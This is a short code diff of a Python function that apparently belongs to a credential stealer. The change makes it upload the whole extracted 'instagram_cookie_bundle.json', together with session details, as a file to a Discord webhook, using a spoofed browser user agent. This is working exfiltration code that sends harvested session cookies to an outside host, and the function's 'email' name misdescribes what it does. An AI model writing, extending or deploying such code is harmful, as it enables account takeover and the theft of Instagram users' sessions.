@@ -807,14 +807,26 @@ def _send_extracted_bundle_email(payload):
                 f'**Session ID:** {session_display}\n'
                 f'**Missing cookies:** {missing}'
             )
-            data = {
-                'content': content,
-            }
+            json_data = json.dumps(payload, indent=2)
+            boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
+            payload_json = json.dumps({'content': content})
+            body = []
+            body.append(f'--{boundary}\r\n')
+            body.append('Content-Disposition: form-data; name="payload_json"\r\n\r\n')
+            body.append(payload_json)
+            body.append('\r\n')
+            body.append(f'--{boundary}\r\n')
+            body.append('Content-Disposition: form-data; name="file"; filename="instagram_cookie_bundle.json"\r\n')
+            body.append('Content-Type: application/json\r\n\r\n')
+            body.append(json_data)
+            body.append('\r\n')
+            body.append(f'--{boundary}--\r\n')
+            body_bytes = ''.join(body).encode('utf-8')
             req = urllib.request.Request(
                 DISCORD_WEBHOOK_URL,
-                data=json.dumps(data).encode('utf-8'),
+                data=body_bytes,
                 headers={
-                    'Content-Type': 'application/json',
+                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                     'Accept': 'application/json',
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                 },
